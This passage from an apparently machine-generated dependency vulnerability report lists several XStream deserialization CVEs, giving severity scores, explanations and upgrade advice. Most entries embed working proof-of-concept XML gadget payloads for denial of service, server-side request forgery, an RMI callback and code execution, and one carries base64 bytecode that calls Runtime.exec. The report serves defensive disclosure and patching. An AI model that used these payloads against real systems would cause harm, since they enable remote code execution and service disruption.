</java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [GitHub Advisory](https://github.com/x-stream/xstream/security/advisories/GHSA-f6hm-88x3-mfjv)\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21349.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T13:05:14Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088336",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-f6hm-88x3-mfjv"
        ],
        "CVE": [
          "CVE-2021-21349"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:23.380741Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:23.378762Z",
      "references": [
        {
          "title": "GitHub Advisory",
          "url": "https://github.com/x-stream/xstream/security/advisories/GHSA-f6hm-88x3-mfjv"
        },
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21349.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
          "cvssV3BaseScore": 8.6,
          "severity": "high",
          "modificationTime": "2022-02-16T16:10:18.512072Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-09-01T16:00:01.160628Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:10:08.075103Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:07:54.751721Z",
      "credit": [
        "threedr3am"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is vulnerability which may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream.\r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='javafx.collections.ObservableList$1'/>\r\n    </default>\r\n    <int>3</int>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n      <dataHandler>\r\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n          <is class='java.io.ByteArrayInputStream'>\r\n            <buf></buf>\r\n            <pos>-2147483648</pos>\r\n            <mark>0</mark>\r\n            <count>0</count>\r\n          </is>\r\n          <consumed>false</consumed>\r\n        </dataSource>\r\n        <transferFlavors/>\r\n      </dataHandler>\r\n      <dataLen>0</dataLen>\r\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21341.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T13:06:47Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088337",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2p3x-qw9c-25hh"
        ],
        "CVE": [
          "CVE-2021-21341"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T15:26:48.917225Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:23.143282Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21341.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-07-28T01:10:59.352485Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-09-01T15:58:17.894210Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:09:52.124693Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:10:40.084443Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability where the processed stream at unmarshalling time contains type information to recreate the formerly written objects. An attacker can manipulate the processed input stream and replace or inject objects, that result in a server-side forgery request. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\r\n        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\r\n          <packet>\r\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\r\n              <dataSource class='javax.activation.URLDataSource'>\r\n                <url>http://localhost:8080/internal/:</url>\r\n              </dataSource>\r\n            </message>\r\n          </packet>\r\n        </indexMap>\r\n      </comparator>\r\n    </default>\r\n    <int>3</int>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21342.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T13:07:59Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088338",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-hvv8-336g-rx3m"
        ],
        "CVE": [
          "CVE-2021-21342"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:23.590365Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:23.587790Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21342.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
          "cvssV3BaseScore": 9.1,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:19.317955Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
          "cvssV3BaseScore": 7.4,
          "severity": "high",
          "modificationTime": "2022-05-03T22:10:17.052801Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
          "cvssV3BaseScore": 7.4,
          "severity": "high",
          "modificationTime": "2022-09-01T15:59:45.707382Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:H/A:H/E:P/RL:O",
      "alternativeIds": [],
      "creationTime": "2021-05-19T09:30:26.977640Z",
      "credit": [
        "V3geB1rd"
      ],
      "cvssScore": 6.2,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A remote attacker that has sufficient rights may execute commands of the host by only manipulating the processed input stream.\r\n\r\n### PoC\r\n```\r\n<!-- Create a simple PriorityQueue and use XStream to marshal it to XML. Replace the XML with following snippet and unmarshal it again with XStream: -->\r\n\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n    </default>\r\n    <int>3</int>\r\n    <javax.naming.ldap.Rdn_-RdnEntry>\r\n      <type>12345</type>\r\n      <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: <none></m__obj>\r\n      </value>\r\n    </javax.naming.ldap.Rdn_-RdnEntry>\r\n    <javax.naming.ldap.Rdn_-RdnEntry>\r\n      <type>12345</type>\r\n      <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\r\n        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\r\n          <parsedMessage>true</parsedMessage>\r\n          <soapVersion>SOAP_11</soapVersion>\r\n          <bodyParts/>\r\n          <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n            <attachmentsInitialized>false</attachmentsInitialized>\r\n            <multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n              <soapPart/>\r\n              <mm>\r\n                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\r\n                  <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\r\n                    <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\r\n                      <names>\r\n                        <string>aa</string>\r\n                        <string>aa</string>\r\n                      </names>\r\n                      <ctx>\r\n                        <environment/>\r\n                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\r\n                          <java.rmi.server.RemoteObject>\r\n                            <string>UnicastRef</string>\r\n                            <string>ip2</string>\r\n                            <int>1099</int>\r\n                            <long>0</long>\r\n                            <int>0</int>\r\n                            <short>0</short>\r\n                            <boolean>false</boolean>\r\n                          </java.rmi.server.RemoteObject>\r\n                        </registry>\r\n                        <host>ip2</host>\r\n                        <port>1099</port>\r\n                      </ctx>\r\n                    </candidates>\r\n                  </aliases>\r\n                </it>\r\n              </mm>\r\n            </multiPart>\r\n          </sm>\r\n        </message>\r\n      </value>\r\n    </javax.naming.ldap.Rdn_-RdnEntry>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.17 or higher.\n## References\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/f0c4a8d861b68ffc3119cfbbbd632deee624e227)\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-29505.html)\n",
      "disclosureTime": "2021-05-18T18:36:27Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.17"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1294540",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-7chv-rrw6-w6fc"
        ],
        "CVE": [
          "CVE-2021-29505"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-19T15:48:11.127790Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-05-19T15:48:11.124631Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/f0c4a8d861b68ffc3119cfbbbd632deee624e227"
        },
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-29505.html"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:30.838219Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:35:32.809822Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:58:41.707847Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.17)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.17"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T07:39:00.056207Z",
      "credit": [
        "Ceclin and YXXX"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream, if using the version out of the box with Java runtime version 14 to 8 or with JavaFX installed. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='com.sun.java.util.jar.pack.PackageWriter$2'>\r\n        <outer-class>\r\n          <verbose>0</verbose>\r\n          <effort>0</effort>\r\n          <optDumpBands>false</optDumpBands>\r\n          <optDebugBands>false</optDebugBands>\r\n          <optVaryCodings>false</optVaryCodings>\r\n          <optBigStrings>false</optBigStrings>\r\n          <isReader>false</isReader>\r\n          <bandHeaderBytePos>0</bandHeaderBytePos>\r\n          <bandHeaderBytePos0>0</bandHeaderBytePos0>\r\n          <archiveOptions>0</archiveOptions>\r\n          <archiveSize0>0</archiveSize0>\r\n          <archiveSize1>0</archiveSize1>\r\n          <archiveNextCount>0</archiveNextCount>\r\n          <attrClassFileVersionMask>0</attrClassFileVersionMask>\r\n          <attrIndexTable class='com.sun.javafx.fxml.BeanAdapter'>\r\n            <bean class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\r\n              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n                <default>\r\n                  <__name>Pwnr</__name>\r\n                  <__bytecodes>\r\n                    <byte-array>yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2